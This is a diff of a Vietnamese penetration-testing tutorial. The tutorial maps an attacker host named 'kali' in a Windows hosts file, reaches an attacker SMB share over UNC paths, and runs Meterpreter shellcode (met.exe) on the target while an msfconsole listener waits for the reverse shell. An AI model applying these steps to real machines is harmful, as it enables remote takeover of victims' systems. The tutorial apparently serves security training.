@@ -15,9 +15,9 @@ Thay đổi file hosts trên máy Windows để tạo kết nối UNC sang máy 
 Dùng notepad để thêm 1 dòng trong file hosts.
 ```
 # localhost name resolution is handled within DNS itself.
-#	127.0.0.1       localhost
-#	::1             localhost
-  <Địa chỉ IP>    kali
+#  127.0.0.1       localhost
+#  ::1             localhost
+    <Địa chỉ IP>   kali
 ```
 
 Để tạo SMB server trên máy tấn công ([Nếu không có lệnh smbserver.py]())
@@ -35,7 +35,7 @@ pushd <Đường dẫn UNC>
 popd <Đường dẫn UNC>
 ```
 
-Để tạo listener trên máy tấn công khi thực thi shellcode:
+Thực thi shellcode (file python) trên máy Windows và tạo listener trên máy tấn công với các lệnh sau:
 ```
 # Exploit after met.exe execution
 $ msfconsole
